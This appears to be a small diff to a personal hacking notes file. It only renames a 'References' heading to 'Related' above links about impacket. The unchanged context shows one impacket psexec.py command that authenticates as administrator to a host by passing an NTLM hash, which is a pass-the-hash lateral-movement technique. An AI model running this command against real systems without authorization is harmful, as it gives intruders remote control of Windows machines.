@@ -3,7 +3,7 @@
 psexec.py administrator@$IP -hashes abcd123abcd123abcd123abcd123abcd:abcd123abcd123abcd123abcd123abcd
 ```
 
-# References
+# Related
 - [20221003150600](/zet/20221003150600/README.md) impacket
 - ~/kb/hacking/commands/impacket-commands.md
 
